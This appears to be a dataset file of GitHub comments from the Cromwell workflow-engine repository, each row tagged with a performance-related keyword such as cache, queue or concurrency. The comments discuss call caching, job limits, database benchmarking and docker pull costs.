Performance,"I can confirm that it is possible to set CPU's, memory, queue and project in the current develop branch. Only wall time I'm not so sure. @kshakir: Maybe you know more about this?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-242440566:56,queue,queue,56,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/583#issuecomment-242440566,1,['queue'],['queue']
Performance,"I can understand. This solution is not ideal. On the upside: it is only activated for those who willingly put ""cached-copy"" in their configs. The rest of the cromwell users are **not** affected by the lock mechanism. By default this does **not** affect anyone. I could adapt this PR and plaster the words: `WARNING: EXPERIMENTAL` all over it if that helps. EDIT: While I mention it ""is not ideal"", the only situation where the locks might not be effective is when using multiple cromwell processes, that do use the same execution folder. Does this happen often in practice? Is this even a supported use case?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-498211225:111,cache,cached-copy,111,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4900#issuecomment-498211225,1,['cache'],['cached-copy']
Performance,"I can't think of any runtime parameters (with the exception of `docker`); that should change the hashing. Also, are the inputs to the task hashed or; is it the fully rendered command block or what? Because if I have a; parameter to the task (such as ""preemptible_attempts"") that is only used in; the runtime block, (ideally) I'd like it to be ignored for call caching; purposes. On Fri, Sep 8, 2017 at 3:12 PM, Kate Voss <notifications@github.com> wrote:. > As a *workflow runner*, I want *certain parameters to be ignored in the; > hashing process*, so that I can *call cache on more workflows when the; > result is exactly the same*.; >; > - Effort: *?*; > - Risk: *Medium*; > - We should err on the side of hashing a workflow differently if we; > are not absolutely confident that the parameter does not impact the result.; > - Which parameters are ignored is NOT user-editable. This is to; > prevent users from accidentally ignoring parameters that do impact the; > result.; > - Business value: *Medium*; >; > Some parameters, such as preemptible_attempts and CPU, don't affect the; > outcome of the workflow but workflows with different CPU values will not; > call cache.; >; > @LeeTL1220 <https://github.com/leetl1220> and @geoffjentry; > <https://github.com/geoffjentry> to provide additional thoughts and; > context if helpful.; > Related issue #1210; > <https://github.com/broadinstitute/cromwell/issues/1210>; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/2604>, or mute the; > thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk24fM_SrXs0gx-Ry1aw1opHFZAb5ks5sgZG5gaJpZM4PRlLU>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 8011A; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717:571,cache,cache,571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2604#issuecomment-328198717,2,['cache'],['cache']
Performance,"I conducted a bunch of testing on alpha and I have Results!. The test runs clocked in as follows:; - Client-side filtering (this PR, `fabece5`); - 1 hour, 1 minute, ; https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/470/; - 1 hour, 2 minutes, https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/471/; - Filtering in MySQL (original, `f666098`); - 1 hour, 2 minutes, https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/472/; - 1 hour, 2 minutes, https://fc-jenkins.dsp-techops.broadinstitute.org/job/PerformanceTest-against-Alpha/473/. The graphs below show the two client-side filtering runs, followed by the two MySQL filtering results. ---. Summarizer CPU is identical, inbound network bytes higher:. <img width=""1338"" alt=""Screen Shot 2019-09-13 at 8 13 00 PM"" src=""https://user-images.githubusercontent.com/1087943/64965213-93d73b80-d86a-11e9-9278-03b6f665c378.png"">. ---. Database page read/writes identical:. <img width=""1334"" alt=""Screen Shot 2019-09-13 at 8 13 39 PM"" src=""https://user-images.githubusercontent.com/1087943/64965215-93d73b80-d86a-11e9-9db5-4416f5e94719.png"">. ---. Database CPU identical:. <img width=""1332"" alt=""Screen Shot 2019-09-13 at 8 13 52 PM"" src=""https://user-images.githubusercontent.com/1087943/64965216-946fd200-d86a-11e9-9735-6d91a8b74a4d.png"">. ---. Database egress bytes modestly higher, consistent with higher inbound on summarizer:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 14 33 PM"" src=""https://user-images.githubusercontent.com/1087943/64965217-946fd200-d86a-11e9-8fb5-c11a49da15e4.png"">. ---. Not too surprising, but SQL query rate also identical:. <img width=""1336"" alt=""Screen Shot 2019-09-13 at 8 15 13 PM"" src=""https://user-images.githubusercontent.com/1087943/64965218-946fd200-d86a-11e9-9db7-3149df61c0e0.png"">. ---. I thought it was interesting that the only variable that showed much change is bytes over the network. Theory:. MySQL pages ",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474:221,Perform,PerformanceTest-against-Alpha,221,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5125#issuecomment-531803474,4,['Perform'],['PerformanceTest-against-Alpha']
Performance,"I did not know of this thread.; At our institute we have solved this differently. We use `singularity exec` and no specific pull command. This will try to locate the image in the cache whis is located in `SINGULARITY_CACHEDIR` (env variable). If it is already there it will use it. If not, it will download it. This will lead to race condition if it is used in a scatter. We use https://github.com/biowdl/prepull-singularity to pull the images beforehand, so no race conditions occur. I am also thinking of adding a `docker_pull` thing to the config, so you can do `singularity exec {image} echo done!` or something similar to make sure the cache is populated at workflow initialization time. I have no ETA on this though, for now the prepull singularity script works.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627146756:179,cache,cache,179,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-627146756,4,"['cache', 'race condition']","['cache', 'race condition', 'race conditions']"
Performance,"I did performance testing by with a wdl that has 50 outputs. On a cache hit, it attempts to copy the 50 files, so with my change it would also perform 50*2 location lookups. I ran this wdl 10 times without my changes, and 10 times with my changes, with `call_cache_egress` set to ""none"". For each run, I looked at the timestamps for [when the job hashing job is initialized](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/job/EngineJobExecutionActor.scala#L504) , to [when the workflow completes](https://github.com/broadinstitute/cromwell/blob/develop/engine/src/main/scala/cromwell/engine/workflow/lifecycle/execution/WorkflowExecutionActor.scala#L350). Without my changes, the difference between those timestamps was on average 9 seconds. . With my changes, the difference between those timestamps was on average 16 seconds.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274:6,perform,performance,6,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6432#issuecomment-892952274,3,"['cache', 'perform']","['cache', 'perform', 'performance']"
Performance,"I did some benchmarking over the weekend. I ran a 1000+ job workflow on both the HSQL database with overflow file, and with sqlite. The Sqlite database creates 99M in files. The HSQLDB creates 9.5G in files, that is 100 times more... I restarted the workflow to see if the call caching worked properly. With the HSQLDB there was no issue in restarting. With SQLite everything worked fine until at some point early in the workflow cromwell hung. I interrupted the process, and cromwell started to shut down gracefully. `WriteMetadataActor shutting down: processing 108720 queued messages`. The processing of these messages takes more than half an hour. . The problem here is twofold: the SQLite backend is significantly slower than the HSQL in-memory database with overflow file (as expected) and the enormous amount of messages that Cromwell produces totally swamps it. (Judging from the shutdown scroll the rate is approximately 40 messages per second or 25ms per message processing time, sqlite should be able to work faster than that). EDIT: I did some research. It turns out SQLite creates a journal file and deletes it again. This means every transaction there are a few filesystem operations performed:; - Create a journal file; - Update the database (append); - Delete the journal file (rewrite the directory file). . This can be slightly improved by setting `journal_mode=truncate` which doesn't delete the journal file so the directory file doesn't have to be rewritten. `journal_mode=memory` doesn't increase the speed much and adds the ability of data corruption. The `cache_size` pragma doesn't speed up things either.; I have been testing some more and the solution for now is just to be patient. The hang is resolved after a few minutes. The long-term solution is to limit the amount of database transactions that cromwell wants to perform on the metadata database. 100K + is quite a lot. . EDIT2:; After some further impatience, I decided to drop the metadata altogether. In our specifi",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906:571,queue,queued,571,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6091#issuecomment-735646906,1,['queue'],['queued']
Performance,"I feel like overall WDL developers need to have some way to control that docker images be cached within the WDL. Tasks that are not scattered are likely not relevant here, as one single download is unlikely to incur large egress charges. On the other hand for scattered tasks there should be a way for the WDL developer to demand caching, rather than relying on the user to do the right thing. Ideally this should all be handled by Google and container images, when downloaded, should be cached for a pre-determined amount of time. There is something called `mirror.gcr.io` but I did not fully understand how it works and whether it could be part of the solution here.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788:90,cache,cached,90,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-888389788,2,['cache'],['cached']
Performance,"I found the config file in this link [cromwell.examples.conf](https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf);. **BUT** when I set the `concurrent-job-limit = 2`, and run with `-Dconfig.file=cromwell.conf`，in `local` mode，but cromwell still forks **8** job, it seems the limit not working",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-575139656:194,concurren,concurrent-job-limit,194,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-575139656,1,['concurren'],['concurrent-job-limit']
Performance,"I had actually assumed that the singularity pull/caching mechanism would handle simultaneous downloads properly (by allowing only one to progress to fill the cache), but it doesn't appear to.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537242867:158,cache,cache,158,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537242867,1,['cache'],['cache']
Performance,I had interpreted this as not an actual cache per se but just ensuring that there's only ever at most one metadata call per wf in flight. IOW as soon as the request is complete that cache entry would be evicted. I don't think we should be caching-caching.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429011246:40,cache,cache,40,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4226#issuecomment-429011246,2,['cache'],['cache']
Performance,"I have a feeling the message is coming from an underlying Unix command like; ```; $ md5 ~; md5: /Users/anichols: Is a directory; ```; That said, the Cromwell product does seem to make a promise that it can hash & call-cache directories, and I am having trouble reconciling those two premises.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437:218,cache,cache,218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5737#issuecomment-671414437,1,['cache'],['cache']
Performance,"I have already changed that setting, as it was causing a different error. my aws.conf:. ```; include required(classpath(""application"")). aws {; application-name = ""cromwell""; auths = [{; name = ""default""; scheme = ""default""; }]; region = ""us-east-1""; }. engine { filesystems { s3 { auth = ""default"" } } }. backend {; default = ""AWSBATCH""; providers {; AWSBATCH {; actor-factory = ""cromwell.backend.impl.aws.AwsBatchBackendLifecycleActorFactory""; config {; numSubmitAttempts = 3; numCreateDefinitionAttempts = 3; root = ""s3://concr-genomics-results/cromwell-execution""; auth = ""default""; concurrent-job-limit = 16; default-runtime-attributes { queueArn = ""arn:aws:batch:us-east-1:<##########>:job-queue/GenomicsDefaultQueue-<###########>"" }; filesystems { s3 { auth = ""default"" } }; }; }; }; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016997:587,concurren,concurrent-job-limit,587,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4341#issuecomment-435016997,3,"['concurren', 'queue']","['concurrent-job-limit', 'queue', 'queueArn']"
Performance,"I have moved to cromwell v53.1 now. However the caching still doesn't work for me. I consistently get an error like this:. > 2020-11-07 17:54:51,634 cromwell-system-akka.dispatchers.engine-dispatcher-35 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Failure copying cache results for job BackendJobDescriptorKey_CommandCallNode_GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 (EnhancedCromwellIoException: [Attempted 1 time(s)] - RejectedExecutionException: ); > 2020-11-07 17:54:51,635 cromwell-system-akka.dispatchers.engine-dispatcher-35 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Invalidating cache entry CallCachingEntryId(347) (Cache entry details: Some(7b292def-1477-4450-988a-e01627d61786:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0)); > 2020-11-07 17:54:51,673 cromwell-system-akka.dispatchers.backend-dispatcher-7385 WARN - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-BackendCacheHitCopyingActor-0123c178:GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:-1:1-5 [UUID(0123c178)GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1]: Unrecognized runtime attribute keys: preemptible; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-38 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.CreateSequenceGroupingTSV:NA:1 [UUID(0123c178)]: Call cache hit process had 0 total hit failures before completing successfully; > 2020-11-07 17:54:51,674 cromwell-system-akka.dispatchers.engine-dispatcher-33 INFO - 0123c178-1d7e-4fbc-94bd-7fc147e5ccfb-EngineJobExecutionActor-GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1 [UUID(0123c178)]: Could not copy a suitable cache hit for 0123c178:GATK4_WGS_ALL_IN_ONE.N_SamToFastqAndBwaMem:0:1. EJEA attempted to copy 1 cache hits before failing. Of these 1 failed to copy and 0 were already blacklisted from previous attempts). Fa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807:352,cache,cache,352,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5977#issuecomment-723478807,3,"['Cache', 'cache']","['Cache', 'cache']"
Performance,"I have run both strategies with a workflow that generates around about 2000 jobs (100 samples) using GATK best practices for RNA variant calling. . ### Method. The Cromwell instance ran with a SLURM cluster backend. All jobs were run using singularity containers. The cromwell process was limited to 3 akka threads and 1 GC thread (by default it grabs al threads on the login node, and this is not fair to other users). The HSQLDB memory database with persistance file was used. Said SLURM cluster has its storage connected via NFS. Two configurations of cromwell were used. One with the xxh64 strategy, and one with the fingerprint strategy. Each cromwell instance was executed in its own directory, with its own database and own cromwell-executions folder. The [BioWDL RNA-seq](https://github.com/biowdl/rna-seq) workflow was run. After running, the workflow was run again to see if the call-caching worked correctly. ### Results; Both `xxh64` and `fingerprint` strategies were able to rerun the workflow with a 100% Cache hit. The fingerprint strategy however was much quicker:; `time` results for fingerprint; ```; real 23m26.269s; user 15m31.229s; sys 2m43.406s; ```; `time` results for xxh64; ```; real 69m12.478s; user 56m7.371s; sys 52m6.262s; ```. ### Conclusion; Using xxh64 as a strategy requires some calculation but one hour for 100 samples on 2000 jobs is quite acceptable. What is obvious is that the system IO (`sys` time) takes a lot of time as well. This cluster has very fast optimized ISILON storage, but on clusters without this, any hashing strategy can be quite slow because of this. The fingerprint works very well for HPC environments.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438:1019,Cache,Cache,1019,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5450#issuecomment-601604438,2,"['Cache', 'optimiz']","['Cache', 'optimized']"
Performance,"I have run: ; Workflow: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-workflow.wdl; Inputs: https://github.com/FredHutch/reproducible-workflows/blob/master/WDL/unpaired-panel-consensus-variants-human/broad-containers-inputs.json. Now three times directly with the same input data and every single time for every single task (so the file that is the result of the first task from a previous run of this workflow does not get reused for the second task fo the current run of the workflow, and so on for all the tasks in the entire workflow) I have gotten this:. ```; ""callCaching"": {; ""allowResultReuse"": true,; ""hit"": false,; ""result"": ""Cache Miss"",; ""hashes"": {; ""output count"": ""..."",; ""runtime attribute"": {; ""docker"": ""..."",; ""continueOnReturnCode"": ""..."",; ""failOnStderr"": ""...""; },; ""output expression"": {; ""File output_fastq"": ""..""; },; ""input count"": "".."",; ""backend name"": ""..."",; ""command template"": ""..."",; ""input"": {; ""String base_file_name"": ""..."",; ""File input_bam"": ""...""; }; },; ""effectiveCallCachingMode"": ""ReadAndWriteCache""; ```. So it's not timing out anymore (I replaced hashes with '...'), but never, ever having a `""hit"": true`.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546:715,Cache,Cache,715,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4563#issuecomment-457360546,1,['Cache'],['Cache']
Performance,"I have the exact same issue. First of all, both the [Configuration examples](https://cromwell.readthedocs.io/en/stable/Configuring/#configuration-examples) and [Local](https://cromwell.readthedocs.io/en/stable/backends/Local/) sections of the documentation point to non-existing file https://github.com/broadinstitute/cromwell/tree/develop/cromwell.examples.conf while they should point to https://github.com/broadinstitute/cromwell/blob/develop/cromwell.example.backends/cromwell.examples.conf like lozybean pointed out. This is still not fixed in the documentation. But then I have downloaded the [cromwell.examples.conf](https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf) file and used it as follows:; ```; wget https://raw.githubusercontent.com/broadinstitute/cromwell/develop/cromwell.example.backends/cromwell.examples.conf; sed -i 's/#concurrent-job-limit = 5/concurrent-job-limit = 5/' cromwell.examples.conf; java -Dconfig.file=cromwell.examples.conf -jar cromwell-51.jar run ...; ```. And Cromwell on my laptop still spawned 23 job tasks simultaneously. What do I have to do to limit the number of concurrent jobs? This would be very convenient for me to be able to speed up development of my own WDL. Thank you!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649697302:907,concurren,concurrent-job-limit,907,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5359#issuecomment-649697302,3,['concurren'],"['concurrent', 'concurrent-job-limit']"
Performance,"I have to note that I didn't make this configuration (@rhpvorderman will know more about this); This is in the backend section:; ```; caching {; duplication-strategy: [ ""soft-link"", ""copy"", ""hard-link"" ]; hashing-strategy: ""file""; }; ```; This is on the top level:; ```; call-caching {; enabled = true; invalidate-bad-cache-results = true; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848:318,cache,cache-results,318,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-393886848,1,['cache'],['cache-results']
Performance,"I honestly have not really pulled docker images without Cromwell before, other than on my laptop for minimal testing. If I try to pull a docker manually I do get the same error, as you suggested, even if the Google VM and the GCR bucket are both running on the same Google Cloud network. Isn't this a bad design from Google though? How do I make my dockers available for my WDLs and on Terra while at the same time preventing actors running the same WDLs in Google Clouds in other continents from forcing me to incur egress charges? I must be missing something. I see two possible alternative partial solutions for this issue:. (i) is there a way to write a WDL so that it automatically detects whether it should use `us.gcr.io`, or `eu.gcr.io` or `asia.gcr.io` and so that it would automatically select the one that is closer (and free)? I suppose not, as this would be outside the specification of WDL. Curios what you think though. (ii) is there a way to prevent Cromwell running with PAPIv2 from having to pull a docker image multiple time? I wrote WDLs that run on large cohorts (biobank size) and they can scatter task arrays with ~1,000 shards. If this resulted in pulling a docker once, absorbing the cost would likely still be scalable, but as it is now it is very inefficient and it makes the cost of running the WDL almost dominated by the pulling of the dockers if egress costs are involved. [Notice also that someone from the VA run my WDL but I think that, since the computation was performed on an LSF HPC cluster, the docker image was pulled only once and then reused within the LSF HPC cluster, as I did not notice any significant egress costs when this happened]. @cjllanwarne thank you for reaching out to Google. I hope this spurs a broader discussion. I am not in urgent need for a fix, but I very much hope a solution is available in the long term.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702:1236,scalab,scalable,1236,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6235#issuecomment-814160702,2,"['perform', 'scalab']","['performed', 'scalable']"
Performance,"I love the failure type but since you've done so much, would it be another load of work to use `sttp` + cats-effect backend vs the source of our Future woes, akka?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4624#issuecomment-462491136:75,load,load,75,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4624#issuecomment-462491136,1,['load'],['load']
Performance,"I made some comments regarding concurrency & thread safety. Those weren't a roundabout way of me saying I thought there _was_ a problem, rather I just wanted to make sure that was thought through due to the way that's being called. 👍 . [![Approved with PullApprove](https://img.shields.io/badge/pullapprove-approved-brightgreen.svg)](https://pullapprove.com/broadinstitute/cromwell/pull-request/1273/?utm_source=github-pr&utm_medium=comment-badge&utm_campaign=broadinstitute/cromwell)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758:31,concurren,concurrency,31,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1273#issuecomment-238712758,1,['concurren'],['concurrency']
Performance,"I might be missing something but thinking about it more, I don't think a job can technically really ""cache to itself"", that is because if a workflow is restarted mid run, outputs are retrieved from the job store first (for jobs that had completed), and we shouldn't be even trying to call cache it. It could be caching to another workflow though.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4046#issuecomment-416668196:101,cache,cache,101,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4046#issuecomment-416668196,2,['cache'],['cache']
Performance,I notice the Singularity Cache is now the second topic within Singularity. Do you mind if I put it back at the end? I don't think there's any need to confuse users with it immediately. @illusional,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465392789:25,Cache,Cache,25,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4635#issuecomment-465392789,1,['Cache'],['Cache']
Performance,"I posted at the [following link](https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209), a recommendation to turn the `LocalBackend.scala` into a finite-state machine (FSM) as well - besides `WorkflowManagerActor` in PR https://github.com/broadinstitute/cromwell/pull/413 - and catch when the script performs a `SIGINT`:. https://github.com/broadinstitute/cromwell/issues/404#issuecomment-177665209. ~p",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-177668094:323,perform,performs,323,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/397#issuecomment-177668094,1,['perform'],['performs']
Performance,"I ran a couple workflows, against 0.19 and against develop (considering the workflow id wrapping issue is resolved). Here are some differences I found, there might be other that those workflow didn't catch.; - The ""Collector"" of a scatter is present in the metadata in develop, and wasn't in 0.19. Oddly it doesn't contain its output though : . ```; {; ""attempt"": 1,; ""executionStatus"": ""Done"",; ""shardIndex"": -1; }; ```; - `stdout` and `stderr` are missing (**Local only**); - `runtimeAttributes` is missing ; Completely missing on local.; On JES, only attributes in the WDL show up, those for which the default value was used are missing.; - `executionEvents` is missing (even if there is none, there is an attribute with an empty list in 0.19); - `cache` is missing (**Local only**); e.g. ```; ""cache"": {; ""allowResultReuse"": true; }; ```; - `inputs` at the call level is missing if there are no inputs (`""inputs"" : {}` was present in 0.19); - `inputs` at the workflow level is missing if there are no inputs (`""inputs"" : {}` was present in 0.19); - `outputs` at the workflow level is missing if there are no inputs (`""outputs"" : {}` was present in 0.19); - Scatter keys are shown in develop's metadata as a normal call:. ```; ""w.$scatter_0"": [; {; ""attempt"": 1,; ""executionStatus"": ""Done"",; ""shardIndex"": -1; }; ]; ```; - `submission` is missing; - In 0.19, all ""first level"" (non-shards) calls would appear in the metadata right away, with a `NotStarted` status and some basic available information:. ```; ""example.gatherUltimateAnalysis"": [; {; ""executionStatus"": ""NotStarted"",; ""shardIndex"": -1,; ""outputs"": {},; ""runtimeAttributes"": {},; ""cache"": {; ""allowResultReuse"": true; },; ""inputs"": {; ""array"": ""ultimateAnalysis.out""; },; ""backend"": ""JES"",; ""attempt"": 1,; ""executionEvents"": []; }; ]; ```. In develop, a call appears in the metadata only at runtime; - `backendStatus` has been renamed to `jesOperationStatus` (JES status)",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/936#issuecomment-223718341:751,cache,cache,751,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/936#issuecomment-223718341,3,['cache'],['cache']
Performance,"I ran into a related issue while running the ENCODE HiC pipeline via Caper on SLURM. I opened an issue there too. On our HPC I need to `module load cuda/11.7` to use the `nvcc` binary. I tried `--wrap='module load cuda/11.7'` but while this gets passed to the `sbatch` command it returns a script argument not permitted error, possibly because `module` isn't a binary but a bash function? Are there any other options for using Caper/Cromwell with the `module` system?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-1430297902:143,load,load,143,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4997#issuecomment-1430297902,2,['load'],['load']
Performance,"I read this as complaining about having all of the separate calls + the logic to dig into the config everywhere, not a complaint about physically loading the config. That said, having looked at this w/ that lens a few times I never saw a way that'd work everywhere which would be better than doing the above",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234340037:146,load,loading,146,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/796#issuecomment-234340037,1,['load'],['loading']
Performance,I recommend using the call cache diff endpoint; ```; GET ​/api​/workflows​/v1/callcaching​/diff; ```. > This endpoint returns the hash differences between 2 completed (successfully or not) calls.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6316#issuecomment-823638176,1,['cache'],['cache']
Performance,"I see how this is related to the WDL description and not to much with the implementation. For `read_lines` WDL specification, it says that the order should be the same as in the file-like object; but it is unclear if map is ordered, and there is no specific behavior to the `read_map` function. I would say that whenever things comes from a file it would be a good idea to keep the order, but I understand the possible problems with performance. Although if `LinkedHashMap` is used I can only see problems with performance if deletion/insertion in concrete indexes is required; definitely a `TreeMap` does not look like a good idea because the ""natural order"" might not be the one for the final user. Thanks for looking into this @Horneth and @cjllanwarne!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368548965:433,perform,performance,433,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3314#issuecomment-368548965,2,['perform'],['performance']
Performance,"I see, so in order to call cache on an old workflow Cromwell has to dig into the database. . - Effort: **?**; - Risk: **Medium**; - Business value: **Small**",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274:27,cache,cache,27,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1670#issuecomment-326330274,1,['cache'],['cache']
Performance,"I still see this, somewhat. It might be due to the long time on cromwell; final overhead. In other words, my job finishes, but the overhead takes so; long that an unrelated failure prevents the write to the call-cache; database. On Tue, Apr 4, 2017 at 12:48 PM, Kate Voss <notifications@github.com> wrote:. > If there are no more problems, we'll close this.; >; > —; > You are receiving this because you were mentioned.; > Reply to this email directly, view it on GitHub; > <https://github.com/broadinstitute/cromwell/issues/1494#issuecomment-291561557>,; > or mute the thread; > <https://github.com/notifications/unsubscribe-auth/ACDXk0dV9BaGvlpzXleUmgZ3s6-BsN6Lks5rsnRngaJpZM4KJB9H>; > .; >. -- ; Lee Lichtenstein; Broad Institute; 75 Ames Street, Room 7003EB; Cambridge, MA 02142; 617 714 8632",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1494#issuecomment-291572106:212,cache,cache,212,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1494#issuecomment-291572106,1,['cache'],['cache']
